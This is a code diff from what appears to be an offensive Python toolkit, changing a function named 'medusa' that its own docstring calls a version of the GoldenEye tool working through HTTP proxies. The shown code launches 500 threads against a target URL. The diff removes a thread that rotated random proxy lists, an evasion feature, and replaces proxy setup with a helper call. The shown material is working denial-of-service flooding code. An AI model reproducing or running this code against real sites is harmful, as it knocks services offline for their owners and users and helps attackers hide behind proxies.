@@ -3001,19 +3001,7 @@ class medu(threading.Thread):
       time.sleep(.01)
   except Exception as ex:
    pass
-class swi(threading.Thread):
- def run(self):
-  global httpp
-  while (stop!=True):
-   time.sleep(random.randint(minswitch,maxswitch))
-   httpp=[]
-   while True:
-    r=random.choice(httplist)
-    if (r not in httpp):
-     httpp.append(r)
-    if (len(httpp)>random.randint(minpr,maxpr)):
-     break
-def medusa(u,threads=500,httpl=None,maxtime=5,switching=True,maxprox=70,minprox=60,mint=40,maxt=60,interval=300,logs=True,returning=False):
+def medusa(u,threads=500,maxtime=5,interval=300,logs=True,returning=False):
  '''
    this function is aversion of goldeneye tool that works with HTTP proxies only.
 '''
@@ -3023,24 +3011,9 @@ def medusa(u,threads=500,httpl=None,maxtime=5,switching=True,maxprox=70,minprox=
  prints=logs
  global target
  target=u
- global httplist
- if httpl:
-  httplist=httpl
- else:
-  httplist=masshttp()
- global httpp
- for x in range(random.randint(minprox,maxprox)):
-  httpp.append(random.choice(httplist))
+ httpp=mdpr()
  global timeout
  timeout=maxtime
- global maxswitch
- maxswitch=maxt
- global minswitch
- minswitch=mint
- global minpr
- minpr=minprox
- global maxpr
- maxpr=maxprox
  for x in range(threads):
   t = medu()
   t.start()
